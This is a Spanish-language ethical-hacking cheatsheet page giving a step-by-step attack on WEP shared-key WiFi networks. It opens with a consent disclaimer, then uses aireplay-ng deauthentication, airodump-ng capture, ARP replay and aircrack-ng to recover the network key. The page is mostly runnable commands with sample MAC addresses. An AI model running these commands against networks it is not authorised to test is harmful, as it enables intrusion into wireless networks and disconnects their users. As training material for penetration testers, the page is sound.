
# Redes SKA

{% hint style="danger" %}
**Disclaimer:** Vamos a realizar ataques a redes WiFi, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Configurar red SKA</mark>&#x20;

En el panel de control del WiFi habilitar la opción "Llave compartida"

## 1. Partimos de un Deauth

{% content-ref url="/pages/qeg4sP7H8SEkxd0kUXjq" %}
[Deauth](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-redes/hacking-wifi/deauth.md)
{% endcontent-ref %}

```bash
sudo aireplay-ng --deauth 1 -a 00:E0:4C:6A:5A:F8 -c 2A:2D:C8:0D:EB:F6 wlan0mon
```

## 2. Iniciar airodump-ng

Debemos guardar la salida con `--write`

```bash
# 4 - Iniciamos airodump-ng y guardamos la salida
sudo airodump-ng --bssid 00:E0:4C:6A:5A:F8 --channel 11 --write ska wlan0
```

<figure><img src="/files/MfeKAygnSiatYA2pechH" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Para este ataque es necesario que ya haya algún dispositivo vinculado a la red
{% endhint %}

Para el siguiente paso tendremos que utilizar la MAC de otro dispositivo en la red:

<figure><img src="/files/XSm1vNvBeGAVsBAHLwUz" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Importante:** mantener abierto mientras se ejecuta aireplay-ng
{% endhint %}

## 3. ARP Replay

```bash
sudo aireplay-ng --help

Attack modes (numbers can still be used):

      --deauth      count : deauthenticate 1 or all stations (-0)
      --fakeauth    delay : fake authentication with AP (-1)
      --interactive       : interactive frame selection (-2)
   >> --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)
```

```bash
sudo aireplay-ng --arpreplay -b <SSID-OBJETIVO> -h <MAC-ADAPTADOR> <INTERFAZ> 
```

```bash
sudo aireplay-ng --arpreplay -b 00:E0:AC:6A:5A:F8 -h 2A:2D:C8:0D:EB:F6 wlan0mon 
```

<figure><img src="/files/yOJL7G8HpUVUSlJN36Pd" alt=""><figcaption></figcaption></figure>

Para aumentar la velocidad podemos apoyarnos de pequeños deauths:

<figure><img src="/files/hYVB8QYQrt3sqEj01tyH" alt=""><figcaption></figcaption></figure>

Volviendo a airodump vemos que hemos aumentado correctamente el tráfico de red

<figure><img src="/files/svMNYhE340evrgRrQHqK" alt=""><figcaption></figcaption></figure>

### 4. Iniciar aircrack-ng

Abrir el archivo .cap

```bash
sudo aircrack-ng ska.cap
```

<figure><img src="/files/1J5GYoDaLk4bMe931VP1" alt=""><figcaption></figcaption></figure>

```
KEY FOUND! [12:34:56:78:90]
Password: 1234567890
```
